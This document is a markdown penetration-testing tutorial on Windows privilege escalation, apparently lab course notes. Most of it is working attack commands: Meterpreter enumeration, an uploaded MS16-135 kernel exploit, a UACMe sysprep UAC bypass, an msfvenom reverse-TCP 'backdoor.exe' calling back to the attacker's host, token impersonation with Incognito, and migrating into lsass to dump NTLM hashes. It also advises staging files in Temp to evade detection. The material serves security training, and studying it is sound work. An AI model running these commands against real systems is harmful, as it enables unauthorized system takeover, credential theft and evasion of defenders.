# Windows Privilege Escalation

**Privilege escalation** is the process of exploiting vulnerabilities or misconfigurations to elevate access from a low-privileged user to a higher-privileged one — typically `SYSTEM` or local `Administrator`. It is a critical phase of the attack lifecycle and a major determinant of penetration test success.

> ⚠️ **Note**: All commands assume you are operating from a **Kali Linux** attack machine with an active Meterpreter session on the target. Replace IPs and file paths with your actual values.

---

## The Windows Kernel

The **kernel** is the core of an operating system — it has complete control over every resource and hardware component on the system. It acts as a translation layer between hardware and software.

**Windows NT** is the kernel pre-packaged with all modern Windows versions. It operates with two main modes:

| Mode | Access Level | Description |
|------|-------------|-------------|
| **User Mode** | Limited | Programs and services run here with restricted access to system resources |
| **Kernel Mode** | Unrestricted | Full access to system resources, hardware, devices, and memory |

Code executed in **Kernel Mode** runs with the highest level of privileges (`SYSTEM`). Kernel exploits target vulnerabilities in the Windows kernel to execute arbitrary code at this level.

> ⚠️ **Caution**: Kernel exploits can cause **system crashes and data loss**. Avoid in production/enterprise environments unless absolutely necessary.

---

## Privilege Escalation Methodology

```
Gain Initial Access → Enumerate System → Identify Kernel Vulnerabilities → Exploit → SYSTEM Shell
```

### Step 1: Enumerate the System

Once you have a low-privilege Meterpreter session:

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs
```

Copy the `sysinfo` output into a text file on Kali — you will need it for Windows-Exploit-Suggester.

### Step 2: Try Automatic Privilege Escalation

```bash
meterpreter > getsystem
```

`getsystem` attempts several built-in techniques to elevate privileges automatically. If it succeeds, you now have `SYSTEM`. If it fails, proceed manually.

### Step 3: Use local_exploit_suggester (Metasploit)

Background your session and run the post-exploitation module:

```bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION <session_id>
msf6 > run
```

This enumerates all vulnerabilities specific to the Windows version and lists which Metasploit exploit modules will work.

---

## Kernel Exploitation with Windows-Exploit-Suggester

**Windows-Exploit-Suggester** compares the target's patch level against the Microsoft vulnerability database to detect missing patches and available public exploits.

> GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Step 1: Install and Update the Database

```bash
# On Kali
pip install xlrd
./windows-exploit-suggester.py --update
# Generates a dated .xlsx database file e.g. 2024-01-01-mssb.xlsx
```

### Step 2: Get System Info from Target

```bash
meterpreter > sysinfo
# Copy the full output to a file on Kali
```

```bash
# On Kali — save sysinfo output
echo "<paste sysinfo output here>" > systeminfo.txt
```

### Step 3: Run Windows-Exploit-Suggester

```bash
./windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt
```

The tool will list vulnerabilities the system is missing patches for, along with available exploits. Results are ranked — the **first entries are typically the most reliable**.

### Step 4: Download and Transfer the Exploit

Example using **MS16-135**:

```bash
# On Kali — download the compiled exploit binary
# Transfer to target via Meterpreter
meterpreter > upload /root/MS16-135.exe C:\\Users\\admin\\AppData\\Local\\Temp\\MS16-135.exe
meterpreter > shell
C:\> C:\Users\admin\AppData\Local\Temp\MS16-135.exe
```

> **Always upload to the Temp directory** — it is less monitored and less likely to be noticed by the user or security tools.

> A collection of Windows kernel exploits sorted by CVE: https://github.com/SecWiki/windows-kernel-exploits

---

## Bypassing UAC with UACMe

### What is UAC?

**UAC (User Account Control)** is a Windows security feature introduced in Vista that prevents unauthorized changes to the OS. When a program requires elevated privileges:

| User Type | UAC Behavior |
|-----------|-------------|
| **Non-privileged user** | Prompted for **administrator credentials** |
| **Local administrator** | Prompted for **consent** (Yes/No) |

UAC has integrity levels ranging from **Low → Medium → High → System**. If the UAC protection level is set **below High**, programs can be executed with elevated privileges without prompting the user.

### What is UACMe?

**UACMe** is an open-source privilege escalation tool that bypasses UAC on Windows 7 through 10. It abuses the built-in Windows **AutoElevate** mechanism — a feature that allows certain trusted Windows binaries to auto-elevate without a UAC prompt.

> GitHub: https://github.com/hfiref0x/UACME

UACMe contains **60+ methods** (keys), each targeting a different Windows binary or technique. The key you use depends on the **Windows version** of the target.

### UACMe Key Reference

| Key | Method | Windows Version |
|-----|--------|----------------|
| **23** | `autoelevate` via `sysprep.exe` | Windows 7, 8, 8.1, 10 |
| **24** | `autoelevate` via `MMC` | Windows 7, 8, 8.1, 10 |
| **30** | `autoelevate` via `IFileOperation` | Windows 7, 8, 8.1 |
| **41** | `autoelevate` via `sfc.exe` | Windows 7, 8, 8.1, 10 |
| **43** | `autoelevate` via `APPINFO` | Windows 10 |
| **61** | `autoelevate` via `WOW64` logger | Windows 10 |

> Key **23** (`sysprep.exe`) is the most commonly used in labs — it works across Windows 7, 8, 8.1, and 10.

### Usage Syntax

```bash
Akagi32.exe <key> <full_path_to_payload>
Akagi64.exe <key> <full_path_to_payload>
```

Use `Akagi32.exe` for 32-bit targets and `Akagi64.exe` for 64-bit targets.

---

### Full UAC Bypass Workflow

#### Step 1: Gain Initial Meterpreter Session

```bash
msfconsole
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS 10.10.10.10
msf6 > set LHOST <your_ip>
msf6 > exploit
```

Confirm you are in the local administrators group but without elevated privileges:

```bash
meterpreter > getuid
meterpreter > getsystem   # Will fail — UAC is blocking elevation
```

#### Step 2: Migrate to a Stable Process

```bash
meterpreter > pgrep explorer
meterpreter > migrate <explorer_pid>
```

Migrating to `explorer.exe` gives you a more stable session running under the user's context.

#### Step 3: Generate a Malicious Payload

On Kali:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<your_ip> \
  LPORT=1234 \
  -f exe > backdoor.exe
```

#### Step 4: Upload UACMe and the Payload to the Target

```bash
meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter > upload /root/backdoor.exe
```

#### Step 5: Set Up a Listener on Kali

```bash
msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <your_ip>
msf6 > set LPORT 1234
msf6 > exploit -j
```

#### Step 6: Execute the UAC Bypass

Go back to the original Meterpreter session and drop to a shell:

```bash
meterpreter > shell
C:\Users\admin\AppData\Local\Temp> Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

Key `23` triggers `sysprep.exe` AutoElevate — it launches `backdoor.exe` with elevated privileges, bypassing the UAC prompt entirely.

#### Step 7: Dump Hashes from the Elevated Session

On the new elevated Meterpreter session:

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
meterpreter > hashdump
```

Migrating to `lsass.exe` (Local Security Authority Subsystem Service) is necessary because it manages all authentication credentials — migrating into it gives you access to dump NTLM hashes for all users.

---

## Access Token Impersonation

### What are Windows Access Tokens?

**Access tokens** are created by `winlogon.exe` every time a user authenticates. They describe the **security context** (identity + privileges) of a process or thread. All child processes inherit a copy of the parent's token.

Tokens are managed by **LSASS (Local Security Authority Subsystem Service)**.

### Token Types

| Token Type | Created By | Can Impersonate On |
|-----------|-----------|-------------------|
| **Impersonate-level** | Non-interactive login (services, domain logons) | Local system only |
| **Delegate-level** | Interactive login (console, RDP) | Any system — **highest threat** |

Delegate-level tokens are the most dangerous because they can be used to impersonate users across the entire network.

### Required Privileges

To perform token impersonation, you need at least one of:

| Privilege | Description |
|-----------|------------|
| **SeAssignPrimaryToken** | Allows impersonating tokens |
| **SeCreateToken** | Allows creating arbitrary tokens with admin privileges |
| **SeImpersonatePrivilege** | Allows creating a process under another user's security context — **most common** |

Check your current privileges:

```bash
meterpreter > getprivs
```

Look for `SeImpersonatePrivilege` in the output.

### Token Impersonation with Incognito (Metasploit)

**Incognito** is a Metasploit module that lists and impersonates available access tokens after successful exploitation.

#### Step 1: Load Incognito

```bash
meterpreter > load incognito
```

#### Step 2: List Available Tokens

```bash
meterpreter > list_tokens -u
```

Output shows two categories:
- **Delegation Tokens** — interactive logins (most useful)
- **Impersonation Tokens** — non-interactive logins

#### Step 3: Impersonate a Token

```bash
meterpreter > impersonate_token "DOMAIN\\Administrator"
```

Use the exact token name shown in `list_tokens` output, with double backslashes.

#### Step 4: Verify Elevation

```bash
meterpreter > getuid
meterpreter > migrate <explorer_pid>
```

Migrating to `explorer.exe` after impersonation stabilizes the elevated session.

> **If no useful tokens are available**: Use the **Potato Attack** (Juicy Potato, Rotten Potato) — a technique that forces privileged token creation by abusing Windows service interactions. Covered in a separate lesson.

---

## Privilege Escalation Techniques Summary

| Technique | Tool | Requirement | Result |
|-----------|------|-------------|--------|
| **Auto escalation** | `getsystem` | Low-priv Meterpreter session | SYSTEM (if unpatched) |
| **Kernel exploit** | Windows-Exploit-Suggester + exploit binary | Missing patches | SYSTEM |
| **UAC bypass** | UACMe (Akagi) | Local admin group membership | Elevated Administrator |
| **Token impersonation** | Incognito (MSF) | `SeImpersonatePrivilege` | Administrator / SYSTEM |
| **Local exploit suggester** | MSF post module | Active Meterpreter session | Lists all viable exploits |

---

## Key Takeaways

- **Privilege escalation** elevates access from a low-privileged user to `Administrator` or `SYSTEM`.
- **Windows NT** operates in User Mode (restricted) and Kernel Mode (unrestricted). Kernel exploits execute code at the highest privilege level.
- **`getsystem`** attempts automatic privilege escalation — try this first. If it fails, proceed manually.
- **`local_exploit_suggester`** enumerates all viable Metasploit exploit modules for the specific Windows version.
- **Windows-Exploit-Suggester** compares the target's patch level to the Microsoft vulnerability database — outputs ranked missing patches with available exploits.
- **Always upload exploit files to `C:\Users\<user>\AppData\Local\Temp`** — less monitored, less likely to be detected.
- **UAC** prevents unauthorized privilege elevation. UACMe bypasses it by abusing Windows AutoElevate trusted binaries.
- **UACMe key 23** (`sysprep.exe`) works on Windows 7/8/8.1/10 and is the most commonly used in lab environments.
- **Access tokens** define the security context of processes. Delegate-level tokens (from interactive logins) are the most powerful — they work across the network.
- **`SeImpersonatePrivilege`** is the key privilege needed for token impersonation attacks.
- **Incognito** lists and impersonates available tokens. Migrate to `explorer.exe` after impersonation to stabilize the session.
- **Migrate to `lsass.exe`** before running `hashdump` to extract NTLM hashes for all users.
